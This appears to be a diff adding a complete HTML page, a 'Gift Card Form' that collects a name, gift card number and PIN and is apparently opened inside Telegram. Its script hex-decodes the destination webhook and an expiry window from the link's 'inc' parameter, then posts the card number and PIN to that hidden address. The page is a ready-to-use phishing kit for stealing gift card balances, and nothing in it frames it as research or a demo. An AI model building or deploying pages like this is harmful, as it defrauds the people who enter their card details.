@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Gift Card Form</title>
+
+  <style>
+
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family:Arial,sans-serif;
+    }
+
+    body{
+      background:#0f172a;
+      min-height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      padding:20px;
+      color:white;
+    }
+
+    .container{
+      width:100%;
+      max-width:420px;
+      background:#1e293b;
+      padding:28px;
+      border-radius:18px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.35);
+      position:relative;
+    }
+
+    h2{
+      text-align:center;
+      margin-bottom:25px;
+      font-size:28px;
+    }
+
+    .input-box{
+      margin-bottom:18px;
+    }
+
+    label{
+      display:block;
+      margin-bottom:8px;
+      color:#cbd5e1;
+      font-size:14px;
+    }
+
+    input{
+      width:100%;
+      padding:14px;
+      border:none;
+      outline:none;
+      border-radius:12px;
+      background:#334155;
+      color:white;
+      font-size:16px;
+    }
+
+    input::placeholder{
+      color:#94a3b8;
+    }
+
+    button{
+      width:100%;
+      padding:15px;
+      border:none;
+      border-radius:12px;
+      background:#6366f1;
+      color:white;
+      font-size:16px;
+      cursor:pointer;
+      transition:0.2s;
+      font-weight:bold;
+    }
+
+    button:hover{
+      opacity:0.92;
+    }
+
+    .message{
+      margin-top:18px;
+      text-align:center;
+      font-size:15px;
+      color:#f87171;
+      word-break:break-word;
+    }
+
+    .loader-box{
+      display:none;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+      margin-top:20px;
+    }
+
+    .spinner{
+      width:42px;
+      height:42px;
+      border:4px solid rgba(255,255,255,0.2);
+      border-top:4px solid white;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+      margin-bottom:12px;
+    }
+
+    @keyframes spin{
+      100%{
+        transform:rotate(360deg);
+      }
+    }
+
+    .success-box{
+      display:none;
+      text-align:center;
+      margin-top:20px;
+    }
+
+    .success-text{
+      color:#4ade80;
+      font-size:18px;
+      margin-bottom:18px;
+      font-weight:bold;
+    }
+
+    .close-btn{
+      background:#ef4444;
+    }
+
+    .char-count{
+      text-align:right;
+      margin-top:6px;
+      font-size:12px;
+      color:#94a3b8;
+    }
+
+    .hidden{
+      display:none !important;
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="container" id="mainContainer">
+
+    <h2 id="mainTitle">Gift Card Form</h2>
+
+    <div id="formArea">
+
+      <div class="input-box">
+        <label>Name</label>
+
+        <input
+          type="text"
+          id="name"
+          maxlength="20"
+          placeholder="Enter your name"
+        >
+
+        <div class="char-count">
+          <span id="nameCount">0</span>/20
+        </div>
+      </div>
+
+      <div class="input-box">
+        <label>Gift Card Number</label>
+
+        <input
+          type="text"
+          id="cardNumber"
+          inputmode="numeric"
+          placeholder="Only numbers allowed"
+        >
+      </div>
+
+      <div class="input-box">
+        <label>PIN</label>
+
+        <input
+          type="text"
+          id="pin"
+          inputmode="numeric"
+          placeholder="Only numbers allowed"
+        >
+      </div>
+
+      <button id="sendBtn" onclick="sendData()">
+        Send Data
+      </button>
+
+    </div>
+
+    <div class="loader-box" id="loaderBox">
+      <div class="spinner"></div>
+      <div>Sending data...</div>
+    </div>
+
+    <div class="success-box" id="successBox">
+
+      <div class="success-text">
+        Data sent successfully
+      </div>
+
+      <button class="close-btn" onclick="closePage()">
+        Close
+      </button>
+
+    </div>
+
+    <div class="message" id="message"></div>
+
+  </div>
+
+  <script>
+   function hexToString(hex) {
+    let str = '';
+    for (let i = 0; i < hex.length; i += 2) {
+      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+    }
+    return str;
+  }
+  const whereis = new URLSearchParams(window.location.search);
+  const incriptedata = whereis.get("inc") || '7b7d';
+  const jsonString = hexToString(incriptedata);
+  const web_data = JSON.parse(jsonString);
+  
+  
+    const formArea = document.getElementById("formArea");
+    const loaderBox = document.getElementById("loaderBox");
+    const successBox = document.getElementById("successBox");
+    const message = document.getElementById("message");
+
+    const nameInput = document.getElementById("name");
+    const cardInput = document.getElementById("cardNumber");
+    const pinInput = document.getElementById("pin");
+    const countText = document.getElementById("nameCount");
+
+
+    function showOnlyMessage(text){
+      formArea.classList.add("hidden");
+      loaderBox.classList.add("hidden");
+      successBox.classList.add("hidden");
+      message.innerText = text;
+    }
+
+    function validateWebData(){
+      if(
+        !web_data.created_at ||
+        !web_data.webhook ||
+        !web_data.expire_at
+      ){
+        showOnlyMessage("Error");
+        return false;
+      }
+
+
+      const createdAt = Number(web_data.created_at);
+      const expireAt = Number(web_data.expire_at);
+      if(
+        isNaN(createdAt) ||
+        isNaN(expireAt)
+      ){
+        showOnlyMessage("Error");
+        return false;
+      }
+      const currentUnix = Math.floor(Date.now() / 1000);
+      if(
+        currentUnix < createdAt ||
+        currentUnix > expireAt
+      ){
+        showOnlyMessage("Action expired");
+        return false;
+      }
+      return true;
+    }
+
+    // Run validation on page load
+    validateWebData();
+    nameInput.addEventListener("input", () => {
+      nameInput.value = nameInput.value.slice(0, 20);
+      countText.innerText = nameInput.value.length;
+    });
+
+    cardInput.addEventListener("input", () => {
+      cardInput.value = cardInput.value.replace(/\D/g, "");
+    });
+
+    pinInput.addEventListener("input", () => {
+      pinInput.value = pinInput.value.replace(/\D/g, "");
+    });
+
+    // =========================
+    // Send Data
+    // =========================
+
+    async function sendData(){
+
+      // Recheck before sending
+      if(!validateWebData()){
+        return;
+      }
+
+      const name = nameInput.value.trim();
+      const cardNumber = cardInput.value.trim();
+      const pin = pinInput.value.trim();
+      if(!name || !cardNumber || !pin){
+        message.innerText = "Please fill all fields.";
+        return;
+      }
+      message.innerText = "";
+      formArea.style.display = "none";
+      loaderBox.style.display = "flex";
+      const jsonData = {
+        name: name,
+        gift_card_number: cardNumber,
+        pin: pin
+      };
+      try{
+        const response = await fetch(
+          web_data.webhook,
+          {
+            method:"POST",
+            headers:{
+              "Content-Type":"application/json"
+            },
+            body:JSON.stringify(jsonData)
+          }
+        );
+
+        if(response.ok){
+          loaderBox.style.display = "none";
+          successBox.style.display = "block";
+        }else{
+          throw new Error("Failed");
+        }
+      }catch(error){
+        loaderBox.style.display = "none";
+        formArea.style.display = "block";
+        message.innerText = "Error sending data.";
+        console.error(error);
+      }
+    }
+
+    function closePage(){
+      if(window.Telegram && Telegram.WebApp){
+        Telegram.WebApp.close();
+      }else{
+        window.close();
+      }
+    }
+  </script>
+</body>
+</html>
